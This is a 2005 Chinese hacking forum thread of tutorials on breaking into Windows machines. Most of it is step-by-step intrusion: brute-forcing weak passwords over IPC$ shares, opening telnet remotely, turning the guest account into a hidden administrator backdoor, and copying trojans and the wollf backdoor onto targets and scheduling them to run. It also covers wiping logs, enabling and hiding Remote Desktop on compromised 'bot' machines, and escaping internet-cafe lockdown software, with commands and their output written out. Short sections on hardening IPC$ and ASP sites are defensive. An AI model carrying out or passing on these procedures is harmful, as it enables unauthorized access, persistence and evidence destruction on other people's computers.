同样需要一个小程序：ResumeTelnet.exe
命令格式：ResumeTelnet.exe \\server account psw
试例如下：c:\>ResumeTelnet.exe \\*.*.*.* administrator "" 

17 删除一个已建立的ipc$连接
net use \\IP\ipc$ /del 






--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 12:00pm 

ipc$详细解说大全（4） 


十二 ipc$完整入侵步骤祥解 

其实入侵步骤随个人爱好有所不同，我就说一下常见的吧，呵呵，献丑了！ 

1 用扫描软件搜寻存在若口令的主机，比如流光，SSS，X-scan等，随你的便，然后锁定目标，如果扫到了管理员权限的口令，你可以进行下面的步骤了，假设你现在得到了administrator的密码为空 


2 此时您有两条路可以选择：要么给对方开telnet（命令行）,要么给它传木马（图形界面），那我们就先走telnet这条路吧 


3上面开telnet的命令没忘吧，要用到opentelnet这个小程序
c:\>OpenTelnet.exe \\192.168.21.* administrator "" 1 90
如果返回如下信息
*******************************************************
Remote Telnet Configure, by refdom
Email: refdom@263.net
OpenTelnet.exe 

Usage:OpenTelnet.exe \\server username password NTLMAuthor telnetport
*******************************************************
Connecting \\192.168.21.*...Successfully! 

NOTICE!!!!!!
The Telnet Service default setting:NTLMAuthor=2 TelnetPort=23 

Starting telnet service...
telnet service is started successfully! telnet service is running! 

BINGLE!!!Yeah!!
Telnet Port is 90. You can try:"telnet ip 90", to connect the server!
Disconnecting server...Successfully!
*说明你已经打开了一个端口90的telnet。 


4 现在我们telnet上去
telnet 192.168.21.* 90
如果成功，你将获得远程主机的一个shell,此时你可以像控制自己的机器一样控制你的肉鸡了，那么做点什么呢？把guest激活再加入管理组吧，就算留个后门了 


5 C:\>net user guest /active:yes 
*将Guest用户激活，也有可能人家的guest本来就试活的，你可以用net user guest看一下它的帐户启用的值是yes还是no 


6 C:\>net user guest 1234 
*将Guest的密码改为1234,或者改成你喜欢的密码 


7 C:\>net localgroup administrators guest /add 
*将Guest变为Administrator，这样，即使以后管理员更改了他的密码，我们也可以用guest登录了，不过也要提醒您，因为通过安全策略的设置，可以禁止guest等帐户的远程访问，呵呵，如果真是这样，那我们的后门也就白做了，愿上帝保佑Guest。 


8 好了，现在我们来走另一条路，给它传个木马玩玩 


9 首先，我们先建立起ipc$连接
C:\>net use \\192.168.21.*\ipc$ "" /user:administrator 


10 既然要上传东西，就要先知道它开了什么共享
C:\>net view \\192.168.21.*
在 \\192.168.21.*的共享资源
资源共享名 类型 用途 注释 

-----------------------------------------------------------
C Disk 
D Disk 
命令成功完成。
*好了，我们看到对方共享了C,D两个盘，我们下面就可以向任意一个盘复制文件了。再次声明，因为用net view命令无法看到默认共享，因此通过上面返回的结果，我们并不能判断对方是否开启了默认共享。 


11 C:\>copy love.exe \\192.168.21.*\c 
已复制 1 个文件
*用这个命令你可以将木马客户端love.exe传到对方的c盘下，当然，如果能复制到系统文件夹下是最好的了，不容易被发现 


12 运行木马前，我们先看看它现在的时间
net time \\192.168.21.*
\\192.168.21.*的当前时间是 2003/8/22 上午 11:00
命令成功完成 


13 现在我们用at运行它吧，不过对方一定要开了Task Scheduler服务（允许程序在指定时间运行），否则就不行了
C:\>at \\192.168.21.* 11:02 c:\love.exe 
新加了一项作业，其作业 ID = 1 


ipc$详细解说大全（5） 

4 剩下就是等了，等过了11:02，你就可以用控制端去连接了，如果成功你将可以用图形界面去控制远程主机了，如果连接失败，那么它可能在局域网里，也可能程序被防火墙杀了，还可能它下线了（没这么巧吧），无论哪种情况你只好放弃了 


嗯，好了，两种基本方法都讲了。如果你对上面的操作已经轻车熟路了，也可以用更高效的套路，比如用CA克隆guest，用psexec执行木马，用命令：psexec \\tergetIP -u user -p paswd cmd.exe直接获得shell等，这些都是可以得，随你的便。不过最后不要忘了把日志清理干净，可以用榕哥的elsave.exe。
讲了ipc$的入侵，就不能不说如何防范，那么具体要怎样做呢？看下面 


十三 如何防范ipc$入侵 


1 禁止空连接进行枚举(此操作并不能阻止空连接的建立) 

方法1：
运行regedit，找到如下主键[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA]把RestrictAnonymous = DWORD的键值改为：1
如果设置为"1"，一个匿名用户仍然可以连接到IPC$共享，但限制通过这种连接得到列举SAM帐号和共享等信息；在Windows 2000 中增加了"2"，限制所有匿名访问除非特别授权，如果设置为2的话,可能会有一些其他问题发生，建议设置为1。如果上面所说的主键不存在，就新建一个再改键值。 

方法2：
在本地安全设置－本地策略－安全选项－在'对匿名连接的额外限制'中做相应设置 


2 禁止默认共享 

1）察看本地共享资源
运行-cmd-输入net share 

2）删除共享（重起后默认共享仍然存在）
net share ipc$ /delete
net share admin$ /delete
net share c$ /delete
net share d$ /delete（如果有e,f,……可以继续删除） 

3）停止server服务
net stop server /y （重新启动后server服务会重新开启） 

4）禁止自动打开默认共享（此操作并未关闭ipc$共享） 
运行-regedit 

server版:找到如下主键[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters]把AutoShareServer（DWORD）的键值改为:00000000。 

pro版:找到如下主键[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters]把AutoShareWks（DWORD）的键值改为:00000000。 
如果上面所说的主键不存在，就新建(右击-新建-双字节值）一个主健再改键值。 
这两个键值在默认情况下在主机上是不存在的，需要自己手动添加。 


3 关闭ipc$和默认共享依赖的服务:server服务
控制面板-管理工具-服务-找到server服务（右击）-属性-常规-启动类型-选已禁用
这时可能会有提示说：XXX服务也会关闭是否继续，因为还有些次要的服务要依赖于lanmanserver，不要管它。 


4 屏蔽139，445端口 
由于没有以上两个端口的支持，是无法建立ipc$的，因此屏蔽139，445端口同样可以阻止ipc$入侵。 

1）139端口可以通过禁止NBT来屏蔽
本地连接－TCP/IT属性－高级－WINS－选‘禁用TCP/IT上的NETBIOS’一项 

2）445端口可以通过修改注册表来屏蔽
添加一个键值
Hive: HKEY_LOCAL_MACHINE
Key: System\Controlset\Services\NetBT\Parameters
Name: SMBDeviceEnabled 
Type: REG_DWORD
Value: 0
修改完后重启机器 

注意：如果屏蔽掉了以上两个端口，你将无法用ipc$入侵别人。 


3）安装防火墙进行端口过滤 


5 设置复杂密码，防止通过ipc$穷举出密码。 


十四 ipc$入侵问答精选 


上面说了一大堆的理论东西，但在实际中你会遇到各种各样的问题，因此为了给予大家最大的帮助，我看好几个安全论坛，找了n多的帖子，从中整理了一些有代表性的问答，其中的一些答案是我给出的，一些是论坛上的回复，如果有什么疏漏和错误，还请包涵。 


1.进行ipc$入侵的时候，会在服务器中留下记录，有什么办法可以不让服务器发现吗？ 

答：留下记录是一定的，你走后用程序删除就可以了，或者用肉鸡入侵。 


2.你看下面的情况是为什么，可以连接但不能复制
net use \\***.***.***.***\ipc$ "密码" /user:"用户名"
命令成功
copy icmd.exe \\***.***.***.***\admin$
找不到网络路径
命令不成功 

答：可能有两个原因：
1）你的权限不够，不能访问默认共享； 

2）对方没有开启admin$默认共享，不要认为能进行ipc$连接，对方就一定开了默认共享（很多人都这么以为，误区！！），此时你可以试试别的默认共享或普通共享，比如c$,d$,c,d等，如果还是不行，就要看你的权限了，如果是管理员权限，你可以开telnet,如果能成功，在给它开共享也行。 


3.如果对方开了IPC$，且能建立空联接，但打开C、D盘时，都要求密码，我知道是空连接没有太多的权限，但没别的办法了吗？ 

答：建议先用流光或者别的什么猜解一下密码，如果猜不出来，只能放弃，毕竟空连接的能力有限。 


4.我已经猜解到了管理员的密码，且已经ipc$连接成功了，但net view \\ip发现它没开默认共享，我该怎么办？ 

答：首先纠正你的一个错误，用net view是无法看到默认共享的。既然你现在有管理员权限，而且对方又开了ipc$,建议你用opentelnet.exe这个小程序打开它的telent,在获得了这个shell之后，做什么都可以了。 


5.ipc$连接成功后，我用下面的命令建立了一个帐户，却发现这个帐户在我自己的机器上，这是怎么回事？
net uset ccbirds /add 

答：ipc$建立成功只能说明你与远程主机建立了通信隧道，并不意味你取得了一个shell,只有在获得一个shell之后，你才能在远程建立一个帐户，否则你的操作只是在本地进行。 


6.我已进入了一台肉机，用的管理员帐号，可以看他的系统时间，但是复制程序到他的机子上却不行，每次都提示“拒绝访问，已复制0个文件”，是不是对方有什么服务没开，我该怎么办？ 

答：不能copy文件有多个可能，除了权限不够外，还可能是对方c$,d$等默认管理共享没开，或者是对方为NTFS文件格式，通过设置，管理员也未必能远程写文件。既然你有管理员权限，那就开telnet上去吧，然后在开它的共享。 




7.我用Win98能与对方建立ipc$连接吗？ 

答：不可以的，要进行ipc$的操作，建议用win2000 


8.我用net use \\ip\ipc$ "" /user ""成功的建立了一个空会话，但用nbtstat -A IP 却无法导出用户列表，这是为什么？ 

答：空会话在默认的情况下是可以导出用户列表的，但如果管理员通过修改注册表来禁止导出列表，就会出现你所说的情况；或者你自己的NBT没有打开，netstat是建立在NBT之上的。　　 


9.我建立ipc$连接的时候返回如下信息：‘提供的凭据与已存在的凭据集冲突’，怎么回事？ 

答：呵呵，这说明你与目标主机建立了一个以上的ipc$连接，这是不允许的，把其他的删掉吧：net use \\*.*.*.*\ipc$ /del 


10.我在映射的时候出现：
F:\>net use h: \\211.161.134.*\e$
系统发生 85 错误。
本地设备名已在使用中。这是怎么回事？ 

答：你也太粗心了吧，这说明你的h盘正在使用，映射到别的盘符吧！ 


11.我建立了一个连接f:\>net use \\*.*.*.*\ipc$ "123" /user:"ccbirds" 成功了，但当我映射时出现了错误，向我要密码，怎么回事？
F:\>net use h: \\*.*.*.*\c$
密码在 \\*.*.*.*\c$ 无效。
请键入 \\*.*.*.*\c$ 的密码:
系统发生 5 错误。
拒绝访问。 

答：呵呵，向你要密码说明你当前使用的用户权限不够，不能映射C$这个默认共享，想办法提升权限或者找管理员的弱口令吧！默认共享一般是需要管理员权限的。 


12.我用superscan扫到了一个开了139端口的主机，但为什么不能空连接呢？ 

答：你混淆了ipc$与139的关系，能进行ipc$连接的主机一定开了139或445端口，但开这两个端口的主机可不一定能空连接，因为对方可以关闭ipc$共享. 


13.我门局域网里的机器大多都是xp，我用流光扫描到几个administrator帐号口令是空，而且可以连接，但不能复制东西，说错误5。请问为什么？ 

答：xp的安全性要高一些，在安全策略的默认设置中，对本地帐户的网络登录进行身份验证的时候，默认为来宾权限，即使你用管理员远程登录，也只具有来宾权限，因此你复制文件，当然是错误5：权限不够。 


14.我用net use \\192.168.0.2\ipc$ "password" /user:"administrator" 成功，可是 net use i: \\192.168.0.2\c
出现请键入 \\192.168.0.2 的密码，怎么回事情呢？ 

答：虽然你具有管理员权限，但管理员在设置c盘共享权限时可能并未设置允许administrator访问，所以会出现问题。 






--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 12:01pm 

常见ASP脚本攻击及防范技巧 

由于ASP的方便易用，越来越多的网站后台程序都使用ASP脚本语言。但是， 由于ASP本身存在一些安全漏洞，稍不小心就会给黑客提供可乘之机。事实上，安全不仅是网管的事，编程人员也必须在某些安全细节上注意，养成良好的安全习惯，否则会给自己的网站带来巨大的安全隐患。目前，大多数网站上的ASP程序有这样那样的安全漏洞，但如果编写程序的时候注意一点的话，还是可以避免的。 

　　1、用户名与口令被破解 

　　攻击原理：用户名与口令，往往是黑客们最感兴趣的东西，如果被通过某种方式看到源代码，后果是严重的。 

　　防范技巧：涉及用户名与口令的程序最好封装在服务器端，尽量少在ASP文件里出现，涉及与数据库连接的用户名与口令应给予最小的权限。出现次数多的用户名与口令可以写在一个位置比较隐蔽的包含文件中。如果涉及与数据库连接，在理想状态下只给它以执行存储过程的权限，千万不要直接给予该用户修改、插入、删除记录的权限。 

　　2、验证被绕过 

　　攻击原理：现在需要经过验证的ASP程序大多是在页面头部加一个判断语句，但这还不够，有可能被黑客绕过验证直接进入。 

　　防范技巧：需要经过验证的ASP页面，可跟踪上一个页面的文件名，只有从上一页面转进来的会话才能读取这个页面。 
3、inc文件泄露问题 

　　攻击原理：当存在ASP的主页正在制作且没有进行最后调试完成以前，可以被某些搜索引擎机动追加为搜索对象。如果这时候有人利用搜索引擎对这些网页进行查找，会得到有关文件的定位，并能在浏览器中查看到数据库地点和结构的细节，并以此揭示完整的源代码。 

　　防范技巧：程序员应该在网页发布前对它进行彻底的调试；安全专家则需要加固ASP文件以便外部的用户不能看到它们。首先对.inc文件内容进行加密，其次也可以使用.asp文件代替.inc文件使用户无法从浏览器直接观看文件的源代码。inc文件的文件名不要使用系统默认的或者有特殊含义容易被用户猜测到的名称，尽量使用无规则的英文字母。 

　　4、自动备份被下载 

　　攻击原理：在有些编辑ASP程序的工具中，当创建或者修改一个ASP文件时，编辑器自动创建一个备份文件，比如：UltraEdit就会备份一个.bak文件，如你创建或者修改了some.asp，编辑器会自动生成一个叫some.asp.bak文件，如果你没有删除这个bak文件，攻击者可以直接下载some.asp.bak文件，这样some.asp的源程序就会被下载。 

　　防范技巧：上传程序之前要仔细检查，删除不必要的文档。对以BAK为后缀的文件要特别小心。 

　　5、特殊字符 

　　攻击原理：输入框是黑客利用的一个目标，他们可以通过输入脚本语言等对用户客户端造成损坏；如果该输入框涉及数据查询，他们会利用特殊查询语句，得到更多的数据库数据，甚至表的全部。因此必须对输入框进行过滤。但如果为了提高效率仅在客户端进行输入合法性检查，仍有可能被绕过。 

　　防范技巧：在处理类似留言板、BBS等输入框的ASP程序中，最好屏蔽掉HTML、javascript、VBScript语句，如无特殊要求，可以限定只允许输入字母与数字，屏蔽掉特殊字符。同时对输入字符的长度进行限制。而且不但要在客户端进行输入合法性检查，同时要在服务器端程序中进行类似检查6、数据库下载漏洞 

　　攻击原理：在用Access做后台数据库时，如果有人通过各种方法知道或者猜到了服务器的Access数据库的路径和数据库名称，那么他也能够下载这个Access数据库文件，这是非常危险的。 

　　防范技巧： 

　　（1）为你的数据库文件名称起个复杂的非常规的名字，并把它放在几层目录下。所谓 “非常规”， 打个比方说，比如有个数据库要保存的是有关书籍的信息， 可不要给它起个“book.mdb”的名字，而要起个怪怪的名称，比如d34ksfslf.mdb， 并把它放在如./kdslf/i44/studi/的几层目录下，这样黑客要想通过猜的方式得到你的Access数据库文件就难上加难了。 

　　（2）不要把数据库名写在程序中。有些人喜欢把DSN写在程序中，比如： 

　　DBPath = Server.MapPath（“cmddb.mdb”） 

　　conn.Open “driver={Microsoft Access Driver （*.mdb）}；dbq=” & DBPath 

　　假如万一给人拿到了源程序，你的Access数据库的名字就一览无余了。因此建议你在ODBC里设置数据源，再在程序中这样写： 

　　conn.open“shujiyuan” 

　　（3）使用Access来为数据库文件编码及加密。首先在“工具→安全→加密/解密数据库”中选取数据库（如：employer.mdb），然后按确定，接着会出现“数据库加密后另存为”的窗口，可存为：“employer1.mdb”。 

　　要注意的是，以上的动作并不是对数据库设置密码，而只是对数据库文件加以编码，目的是为了防止他人使用别的工具来查看数据库文件的内容。 

　　接下来我们为数据库加密，首先打开经过编码了的 employer1.mdb，在打开时，选择“独占”方式。然后选取功能表的“工具→安全→设置数据库密码”，接着输入密码即可。这样即使他人得到了employer1.mdb文件，没有密码他也是无法看到 employer1.mdb中的内容 
。 







--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 12:01pm 

37秒迅速破解网吧 


在的不光是美萍了,还有就是幻境 
:-)我说一下破它的办法: 

媒体对美萍的漏洞说了许多，但我们这儿的网吧用的是万象幻境，一时好奇想看看它有没有漏洞，就试了试，没想到让我发现了许多，今天为你介绍最简单的几种方法--两分钟即可破解万象幻境的方法。 


先来说说网管类软件的原理。其实，网管类软件不过是个外壳程序而已，它先于其他一切程序加载，提供一个受密码保护的界面，一般用户只能通过这个界面调用一些被允许的程序。为加强管理，网管类软件都有密码保护，封锁热键等功能，如今更是做到了客户机/服务器模式、数据库管理。也因此招徕了许多网友的不满，一时，反抗之声不绝于耳。 


破解的关键在于如何能访问硬盘，因为你要执行的文件或寻找万象幻境的密码都离不开硬盘。那么如何进入硬盘呢？往下看，共为你准备了10种方法： 


1.利用输入法漏洞 


输入法漏洞不是中文Win2000的漏洞吗？没错！不过万象幻境也有这个漏洞！方法很简单：按ctrl+shift打开[M$]拼音输入法(如没有用其它输入法也可，方法类似)，然后将光标插入会员卡号的文本输入框内，接着开始往里面输入任意一个拼音字母，然后就会出现拼音的状态条，在状态条上点击右键，或用键盘上的属性键，就会出现一个下拉菜单，选择其中的定义词组(放心，就算系统限制右键，在这也不管用)然后选择文件菜单里面的保存，就会调出保存对话框，然后随便选择一个文件夹，点击右键，选择资源管理器，打开，一切就OK啦！如果鼠标被限定在那个锁定窗口内，就用键盘操作。 


2.利用QQ 


网吧别的软件可以没有，但QQ绝对会有，否则就不会有那么多人去网吧了。打开QQ，随便选择一个好友，点传送文件， 就会出现一个小窗口，让你选择文件，呵呵 ，秘密就在这里，先找到C盘下的注册表编辑器Regedit.exe，先用鼠标选中该文件，松开鼠标，用鼠标右键点击该文件，这时千万不要松开右键，点鼠标左键，就会出来右键菜单，里面什么都有，删除，打开，复制，呵呵，和不在美萍的限制下一样的，这下你想干什么就可以干什么了。 


3.利用Foxmail或Outlook Express 


以Foxmail为例来讲讲，Outlook Express类同。点“邮件”－>“写新邮件”，在出现的“写邮件”窗口中点击“邮件”菜单下的“增加附件”，就会调出“打开”对话框，可以看到驱动器列表和目录列表了，想怎么样自己看着办吧！ 


4.利用TE 


TE是QQ附带的浏览器，启动它，在地址栏直接输入C：回车，看看出现什么了？哈哈，C盘尽在眼前。但到了C盘有什么用呢，如果网管做了手脚，你还是不能执行文件。但是当我们用鼠标右键点上你要执行的文件(注意，是鼠标的右键)，此时没有任何反映。此时不要松开鼠标右键，再按下鼠标左键，哈哈，看到鼠标正常的右键菜单了吧。这时点击"打开"选项，文件就被打开了。 


5.用看图软件Acdsee 


如果网吧中有这个软件，利用它的浏览功能，可以轻松的找到任何一个文件！呵呵，它的浏览功能帮过我不少忙，其实只要是有驱动器列表和目录列表控件的软件几乎都可以被利用，因为那是Windows的标准控件，一般是很难屏蔽的。 


6.升级网吧管理专家 


你可以“好心”的帮网吧管理者把网吧管理专家升级一下，那就什么密码也没有了，想干什么都可以了。不过，被发现了暴扁一顿可别来找我。 


7.利用IE 


先打开IE，再打开“收藏”菜单，用鼠标将“链接”拖入IE地址栏下面的空白区，然后点击“向上”、“向上”、再“向上”，看到了什么？对了，是C盘根目录！此时已经可以按方法5中所说方法为所欲为了。 


8.Win98登入过程 


在进入Win98登入过程中，网吧管理专家把鼠标锁定在右边的时候，左键单击屏幕，然后按F1键(多按几次)在彻底出现登入窗口的时候，如果成功的话会出现“Windows帮助”窗口，在“选项”下拉菜单中选择“按Web 帮助”，在“Web 帮助”窗口中点击“联机支持”的链接，这时弹出一个Internet Explorer浏览器了。只要在地址栏中输入要访问的站点(如在地址栏里输入http://www.sina.com.cn)或盘符(如c盘 c:\ )，如果网吧管理专家对硬盘进行保护使我们没法访问某个盘符时，可以用按“F3”键(windows默认的查找热键)弹出一个查找窗口后，输入你想打开的文件或文件夹进行查找，找到后即可打开。 


9.桌面快捷方式 


对桌面上的快捷方式点击右键，在弹出的菜单中选择“属性”－>“更改图标”－>“浏览”，可以打开文件浏览窗口，看是不是C盘出来了，然后点击向上到C盘windows文件夹找到系统工具的系统配置实用程序将自启动程序去掉，重启机器这样就可以啦！ 


10.Ctrl+Alt+Del 


上面说的方法太麻烦了，这个简单。在看到窗口的画面时就按Ctrl+Alt+Del，大家会看到一个client项。结束它，但这时候还不行。过一会儿还会启动一次，再按Ctrl+Alt+Del结束它(这个步骤很不好使，要试好多次才能掌握)，太快不行，太慢也不行，试多了就行了，最后你就会百试百灵 。有的网吧管理专家下了补丁，会运行多一次，你再多结束一次任务就行了。 








--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 12:02pm 

开启3389的5种方法（上） 


一:使用的工具: 
1:ipcscan扫描器 
2:终端服务连接工具xpts.exe(WIN 2000/XP 终端连接程序. 内附有COPY 文件的补丁. 格式 IP:Port ) 
3:开终端的脚本rots.vbs(灰色轨迹zzzevazzz的作品) 
4:cscript (在system32文件夹下;98操作系统可能没有 
二:步骤: 
1:用ipcscan扫描弱口令(你们可以自己扫,我也扫到一些弱口令主机.演实时间我在论坛上再发) 

2:用rots.vbs开启终端服务 

说明 cscript ROTS.vbs <目标IP> <用户名> <密码> [服务端口] [自动重起选项] 

格式 cscript.exe rots.vbs ip user userpass port /r 
或者 cscript.exe rots.vbs ip user userpass port /fr 


三:常见问题: 

1:脚本会判断目标系统类型,如果不是server及以上版本,就会提示你是否要取消。因为pro版不能安装终端服务.如果你确信脚本判断错误,就继续安装好了. 

2:可能会出现:Conneting 202.202.202.202 ....Error0x80070776 .Error description: 没有发现指定的此对象导出者,这个还是放弃吧. 

3:可能会连接不上,请用这个格式127.0.0.1:1818 1818是刚才开的端口. 
　 

　 

========================================================================================== 
第二种方法： 
========================================================================================== 
进入后：TELNET上去！ 

c:\>echo [Components] > c:\rock 
c:\>echo TSEnable = on >> c:\rock 
c:\>sysocmgr /i:c:\winnt\inf\sysoc.inf /u:c:\rock /q 
或者！ 
c:\>echo [Components] > d:\wawa 
c:\>echo TSEnable = on >> d:\wawa 
c:\>sysocmgr /i:c:\winnt\inf\sysoc.inf /u:d:\wawa /q 
等会自动启后就OK 


或者： 
在本地利用DOS命令edit建立.bat后缀批处理文件（文件名随意） echo [Components] > c:\sql 

echo TSEnable = on >> 

c:\sqlsysocmgr /i:c:\winnt\inf\sysoc.inf /u:c:\sql /q 

net use \\ip地址\ipc$ 密码 /user:用户名（一般默认:administrator) 

利用at time 获取对方服务器时间。 

copy 路径:\xxx.bat \\ip地址\$c:\winnt 

at time 00:00:00 xxx.bat 

服务器执行命令后，服务器将重新启动，利用3389登陆就OK了！ 
　 

　 

========================================================================================== 

第三种方法： 
========================================================================================== 
进入后,先检查终端组件是否安装: 
c:\>query user 
这个工具需要安装终端服务. 

这样就进一步确定了组件没有被安装.如果返回: 
USERNAME SESSIONNAME ID STATE IDLE TIME LOGON TIME 
>w1 console 0 运行中 . 2002-1-12 22:5 
\\类似这样的信息,可能组件就已安装. 

好!都清楚了,可以开始安装了. 
--------------------------------------------------- 
C:\>dir c:\sysoc.inf /s //检查INF文件的位置 
c:\WINNT\inf 的目录 

2000-01-10 20:00 3,770 sysoc.inf 
1 个文件 3,770 字节 
----------------------------------------------------- 
C:\> dir c:\sysocmgr.* /s //检查组件安装程序 
c:\WINNT\system32 的目录 

2000-01-10 20:00 42,768 sysocmgr.exe 
1 个文件 42,768 字节 
----------------------------------------------------- 
c:\>echo [Components] > c:\rock 
c:\>echo TSEnable = on >> c:\rock 
//这是建立无人参与的安装参数 
c:\>type c:\rock 
[Components] 
TSEnable = on 
//检查参数文件 
------------------------------------------------------ 
c:\>sysocmgr /i:c:\winnt\inf\sysoc.inf /u:c:\rock /q 
----------------------------------------------------- 

这一条就是真正安装组件的命令. 
以上这条命令没有加/R参数,主机在安装完后自动重起. 
如若加了/R参数主机就不会重起. 

如果一切正常的话,几分钟后对方主机将会离线,当它重新回来时, 
3389终端服务就已经开启.你就可以连上去了. 

问题和建议: 

A 在安装过程中,不使用/R,有时主机也不会重起,你就要手动重起他,但在使用诸如:iisreset /reboot命令时,对方 
的屏幕会出现个对话框,写着谁引起的这次启动,离重起还有多少秒. 

B 一次不行可以再试一次,在实际中很有作用. 

C 在输入sysocmgr命令开始安装时,一定不要把命令参数输错,那会在对方出现一个大的对话框,是sysocmgr的帮助,很是显眼, 
而且要求确定.在你的屏幕上是不会有任何反应的,你不会知道出错，所以会有B的建议. 
　 

　 

========================================================================================== 
第四种方法： 
========================================================================================== 

C:\Documents and Settings\shanlu.XZGJDOMAIN>net use \\218.22.155.*\ipc$ "" /us 
er:administrator----------------连接成功！ 
命令成功完成。 

C:\Documents and Settings\shanlu.XZGJDOMAIN>copy wollf.exe \\218.22.155.*\admi 
n$------------------------------拷贝wollf.exe到目标计算机的admin$目录 
已复制 1 个文件。 

C:\Documents and Settings\shanlu.XZGJDOMAIN>copy hbulot.exe \\218.22.155.*\adm 
in$-----------------------------拷贝hbulot.exe到目标计算机的admin$目录 
已复制 1 个文件。 

C:\Documents and Settings\shanlu.XZGJDOMAIN>net time \\218.22.155.* 
\\218.22.155.* 的当前时间是 2002/12/1 上午 06:37 
命令成功完成。 

C:\Documents and Settings\shanlu.XZGJDOMAIN>at \\218.22.155.* 06:39 wollf.exe 
新加了一项作业，其作业 ID = 1--指定wollf.exe在06:39运行 
------------------------------------------------------------------------------------------ 
说明： 
wollf.exe是一个后门程序，很多高手都喜欢nc或者winshell，不过我对他情有独钟！在这里我只介绍与本文内 

容有关的命令参数，它的高级用法不做补充。 
hbulot.exe是用于开启3389服务，如果不是server及以上版本，就不要运行了。因为pro版不能安装终端服务。 
2分钟后...... 







--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 12:02pm 

开启3389的5种方法（下） 


------------------------------------------------------------------------------------------ 
C:\Documents and Settings\shanlu.XZGJDOMAIN>wollf -connect 218.22.155.* 7614 
"Wollf Remote Manager" v1.6 
Code by wollf, http://www.xfocus.org/ 
------------------------------------------------------------------------------------------ 
说明： 
使用wollf连接时要注意wollf.exe要在当前目录，它的连接命令格式：wollf -connect IP 7614 
7614是wollf开放的端口。如果显示如上，说明你已经连接成功，并具有管理员administrator权限。 

------------------------------------------------------------------------------------------ 
[server@D:\WINNT\system32]#dos 

Microsoft Windows 2000 [Version 5.00.2195] 
? 版权所有 1985-2000 Microsoft Corp. 
------------------------------------------------------------------------------------------ 
说明： 
输入dos,你就会进入目标机的cmd下，这时同样具有administrator权限。 


------------------------------------------------------------------------------------------ 
D:\WINNT\system32>cd.. 
cd.. 

D:\WINNT>dir h*.* 
dir h*.* 
驱动器 D 中的卷没有标签。 
卷的序列号是 1CE5-2615 

D:\WINNT 的目录 

2002-11-27 03:07 <DIR> Help 
2002-09-10 12:16 10,752 hh.exe 
2002-10-01 08:29 24,576 HBULOT.exe 
2 个文件 35,328 字节 
1 个目录 9,049,604,096 可用字节 

D:\WINNT>hbulot 
hbulot 
------------------------------------------------------------------------------------------ 
说明： 
因为我们把HBULOT.exe放到目标机的admin$下的，所以先找到它，以上是文件的存放位置。 


========================================================================================== 
D:\WINNT>exit 
exit 

Command "DOS" succeed. 

[server@D:\WINNT\system32]#reboot 


Command "REBOOT" succeed. 

[server@D:\WINNT\system32]# 
Connection closed. 
------------------------------------------------------------------------------------------ 
说明： 
由dos退到wollf的连接模式下用exit命令，HBULOT.exe运行后需重新启动方可生效，这里wollf自带的REBOOT 
命令，执行过在5秒后你就会失去连接。启动完毕后检查一下3389端口是否开放，方法很多，superscan3扫一下 

。这时候你就可以登陆了。如果没有开放3389那就不是server及以上版本，就不要运行了。因为pro版不能安装 

终端服务。 

到这里，你已经拥有3389肉鸡了！但是会不会被别的入侵者发现呢？下面所教的就是怎么让3389只为你服务！ 

我们现在使用的3389登陆器有两种版本，一种是2000/98，一种是XP。二者区别呢？前者使用的默认端口3389对 

目标，后者默认的也是3389端口，但是它还支持别的端口进行连接！所以呢......我们来修改3389的连接端口 

来躲过普通扫描器的扫描！修改方法如下： 
修改服务器端的端口设置 ，注册表有2个地方需要修改。 
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp] 
PortNumber值，默认是3389，修改成所希望的端口，比如1314 
第二个地方： 
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]　 
PortNumber值，默认是3389，修改成所希望的端口，比如1314 
现在这样就可以了。重启系统吧。 
注意：事实上，只修改第二处也是可以的。另外，第二处的标准联结应该是 
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\<connection> 
<connection>表示具体的某个RDP-TCP连结。 
重启过后，看看端口有没有改。 
小技巧：修改注册表键值时，先选择10进制，输入你希望的端口数值，再选择16进制，系统会自动转换。 
　 

========================================================================================== 
第五种方法： 
========================================================================================== 

　 

一.原理性基本安装 
1.将如下注册表键值导入 "肉机" 的注册表中: 

------------- 

Windows Registry Editor Version 5.00 

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\netcache] 
"Enabled"="0" 

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon] 
"ShutdownWithoutLogon"="0" 

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] 
"EnableAdminTSRemote"=dword:00000001 

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server] 
"TSEnabled"=dword:00000001 

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermDD] 
"Start"=dword:00000002 

[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermService] 
"Start"=dword:00000002 

[HKEY_USERS\.DEFAULT\Keyboard Layout\Toggle] 
"Hotkey"="1" 

----------- 
2.重新起动"肉机"。 

3.使用本地的3398客户端，连接 "肉机" . 

4.优(缺)点: 

A."肉机"中 "控制面板-->添加/删除程序-->添加/删除 Windows 组件-->终端服务" 仍然处于未安装状态. 
B."肉机"中 "开始-->程序-->管理工具" 没有任何变动. 
C."肉机"中 "开始-->程序-->管理工具-->服务-->Terminal Services" 变为 "已起动" 和"自动". 
D."肉机"中 "Windows 任务管理器-->进程" 内,增加 "Termsrv.exe". 

5.与"sysocmgr /iysoc.inf /u:u.txt /q" 的比较: 

A."肉机"中 "控制面板-->添加/删除程序-->添加/删除 Windows 组件-->终端服务" 处于已安装状态. 
B."肉机"中 "开始-->程序-->管理工具" 增加 "终端服务管理器","终端服务配置" 和 "终端服务客户端生成器". 
